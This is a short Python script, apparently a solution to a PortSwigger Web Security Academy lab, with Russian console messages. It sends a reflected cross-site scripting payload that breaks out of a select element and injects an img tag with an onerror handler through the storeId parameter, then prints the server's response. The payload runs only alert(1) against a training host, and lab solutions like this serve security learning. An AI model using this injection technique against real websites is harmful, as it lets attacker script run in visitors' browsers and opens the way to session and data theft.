import requests

HOST = "0a7b002503f7512280bc94b8007100a8.web-security-academy.net"
BASE_URL = f"https://{HOST}"
HEADERS = {
    "Host": HOST,
    "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Referer": "https://portswigger.net/",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "cross-site"
}

XSS_PAYLOAD = '"></select><img%20src=1%20onerror=alert(1)>'

def send_xss_payload():
    url = f"{BASE_URL}/product?productId=1&storeId={XSS_PAYLOAD}"

    print(f"[+] Отправляю запрос на {url}")
    response = requests.get(url, headers=HEADERS)

    if response.status_code == 200:
        print("[+] Запрос отправлен успешно!")
        print("Ответ сервера:")
        print(response.text[:500]) 
    else:
        print(f"[-] error code: {response.status_code}")

if __name__ == "__main__":
    send_xss_payload()
